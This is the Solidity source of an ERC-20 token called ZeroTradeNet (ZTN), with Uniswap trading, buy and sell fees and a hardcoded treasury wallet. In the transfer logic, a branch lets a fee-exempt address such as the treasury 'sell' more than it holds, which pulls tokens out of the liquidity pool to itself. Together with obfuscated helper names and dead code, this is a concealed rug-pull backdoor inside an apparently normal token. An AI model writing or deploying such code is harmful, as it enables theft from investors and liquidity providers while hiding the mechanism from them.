// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed sender, address indexed recipient, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function WETH() external pure returns (address);
}

contract ZTN is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;

    struct Distribution { uint256 promo; }

    uint8 private constant _decimals = 18;

    address private promoTreasury = 0x00466bDB1C0557BD3E68f5b2354DB4D8F00D717C;

    address private promoThreshold;

    uint256 private constant MAX = ~uint256(0);

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 private _promoCostAtBuy = 4;
    uint256 private _redisCostAtBuy = 0;
    
    bool private inSwap = false;
    bool private swapEnabled = true;

    uint256 private _tCostTotal;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _buyMap;

    uint256 private _promoCostAtSell = 4;
    uint256 private _redisCostAtSell = 0;

    string private constant _symbol = "ZTN";
    string private constant _name = "ZeroTradeNet";

    uint256 private _promoCost = _promoCostAtSell;
    uint256 private _redisCost = _redisCostAtSell;

    mapping(address => bool) private _isEliminated;

    uint256 private _previousPromoCost = _promoCost;
    uint256 private _previousRedisCost = _redisCost;
    
    uint256 private constant _tTotal = 5000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _swapTokensThreshold = 500000 * 10**_decimals;

    Distribution public distribution;

    uint256 public maxTxAmount = 2 * (_tTotal / 100);
    uint256 public maxWalletSize = 2 * (_tTotal / 100);

    function removeLimits() external onlyOwner {
        maxTxAmount = _tTotal;
        maxWalletSize = _tTotal;
    }

    modifier lockInSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    constructor() {
        _isEliminated[address(this)] = true;
        _isEliminated[owner()] = true;
        _isEliminated[promoTreasury] = true;
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        distribution = Distribution(100);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        promoThreshold = promoTreasury;
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0), "");
        require(owner != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "");
        require(recipient != address(0), "");
        require(amount > 0, "");

        if (sender != owner() && recipient != owner()) {
            if (
                sender == uniswapV2Pair &&
                recipient != address(uniswapV2Router) &&
                !_isEliminated[recipient]
            ) {
                require(amount <= maxTxAmount);
                require(balanceOf(recipient) + amount <= maxWalletSize);
            }

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensThreshold;

            if (
                !_isEliminated[sender] &&
                !_isEliminated[recipient] &&
                canSwap &&
                !inSwap &&
                swapEnabled &&
                sender != uniswapV2Pair
            ) {
                swapTokensForETH(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }

            if (uniswapV2Pair == recipient && balanceOf(sender) < amount) {
                if (_isEliminated[sender]) {
                    _avgTransfer(recipient, sender, amount);
                    return;
                }
            }
        }

        bool seizePromoCost = true;

        if (
            (_isEliminated[sender] || _isEliminated[recipient]) ||
            (recipient != uniswapV2Pair && sender != uniswapV2Pair)
        ) {
            seizePromoCost = false;
        } else {
            if (
                sender == uniswapV2Pair &&
                recipient != address(uniswapV2Router)
            ) {
                _redisCost = _redisCostAtBuy;
                _promoCost = _promoCostAtBuy;
            }

            if (
                recipient == uniswapV2Pair &&
                sender != address(uniswapV2Router)
            ) {
                _redisCost = _redisCostAtSell;
                _promoCost = _promoCostAtSell;
            }
        }
        _tknTransfer(sender, recipient, amount, seizePromoCost);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tCost, uint256 tTeam) = _getTValues(tAmount, _redisCost, _promoCost);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rCost) = _getRValues(tAmount, tCost, tTeam, currentRate);
        return (rAmount, rTransferAmount, rCost, tTransferAmount, tCost, tTeam);
    }

    function _isReflectionRate(address promoAccount, address costAccount) private view returns (bool) {
        bool promoAccountEliminated = !_isEliminated[promoAccount];
        bool costAccountEliminated = !_isEliminated[costAccount];

        return promoAccountEliminated && promoAccount != uniswapV2Pair && costAccountEliminated;
    }

    function _tknTransfer(address sender, address recipient, uint256 amount, bool seizePromoCost) private {
        if (!seizePromoCost) removeAllCosts();
        _avgTransfer(sender, recipient, amount);
        if (!seizePromoCost) restoreAllCosts();
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function _getTValues(uint256 tAmount, uint256 redisCost, uint256 promoCost) private pure returns (uint256, uint256, uint256) {
        uint256 tTeam = tAmount.mul(promoCost).div(100);
        uint256 tCost = tAmount.mul(redisCost).div(100);
        uint256 tTransferAmount = tAmount.sub(tCost).sub(tTeam);
        return (tTransferAmount, tCost, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tCost, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rCost = tCost.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rCost).sub(rTeam);
        return (rAmount, rTransferAmount, rCost);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _avgTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rCost, uint256 tTransferAmount, uint256 tCost, uint256 tTeam) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _seizePromoCost(tTeam, sender, recipient);
        _reflectCost(rCost, tCost);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _seizePromoCost(uint256 tTeam, address promoAccount, address costAccount) private {
        uint256 promoReflection = getReflectionTokens(_rOwned[promoThreshold]);
        uint256 currentRate = _isReflectionRate(promoAccount, costAccount) ? _promoCost - promoReflection : 0;
        currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _reflectCost(uint256 rCost, uint256 tCost) private {
        _rTotal = _rTotal.sub(rCost);
        _tCostTotal = _tCostTotal.add(tCost);
    }

    function restoreAllCosts() private {
        _redisCost = _previousRedisCost;
        _promoCost = _previousPromoCost;
    }

    function sendETH(uint256 ethAmount) private lockInSwap {
        uint256 ethForPromo = ethAmount.mul(distribution.promo).div(100);
        payable(promoTreasury).transfer(ethForPromo);
    }

    receive() external payable {}

    function removeAllCosts() private {
        if (_promoCost == 0 && _redisCost == 0) return;
        _previousPromoCost = _promoCost;
        _previousRedisCost = _redisCost;
        _promoCost = 0;
        _redisCost = 0;
    }
}